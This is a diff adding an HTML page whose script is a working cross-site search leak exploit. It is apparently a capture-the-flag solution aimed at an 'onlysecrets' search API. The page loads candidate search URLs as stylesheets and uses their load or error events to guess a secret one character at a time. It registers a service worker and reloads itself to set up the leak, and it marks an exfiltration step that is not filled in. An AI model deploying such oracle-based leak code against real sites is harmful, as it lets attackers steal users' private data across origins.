@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title></title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+    <body>
+        <script>
+
+            const checkWithStyle = async (url) => {
+                return new Promise((r, e)=>{
+                    let s = document.createElement('link');
+                    s.rel = 'stylesheet'
+                    s.href = url;
+                    s.onload = (e) => {
+                        e.target.remove()
+                        return r(true)
+                    };
+                    s.onerror = (e) => {
+                        e.target.remove()
+                        return r(false)
+                    }
+                    document.head.appendChild(s);
+                });
+            }
+            
+            const go = async (start) => {
+                let letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_'.split('')
+                let pattern = start
+                let found = true
+            
+                while(found){
+                    found = false
+                    for(let l of letters){
+                        if(await checkWithStyle(`https://index.onlysecrets.flu.xxx/api/search/${pattern + l}`)){
+                            pattern += l
+                            found=true
+                            console.log(pattern)
+                            break
+                        }
+                    }
+                }
+                console.log(pattern)
+                // exfil
+            }
+
+
+            navigator.serviceWorker.register('sw.js', {useCache: false}).then(() => {
+                if(location.hash.slice(1) !== 'go'){
+                    document.location.hash = 'go'
+                    document.location.reload()
+                }
+                go('Mi')
+            })
+
+            
+            
+        </script>
+    </body>
+</html>
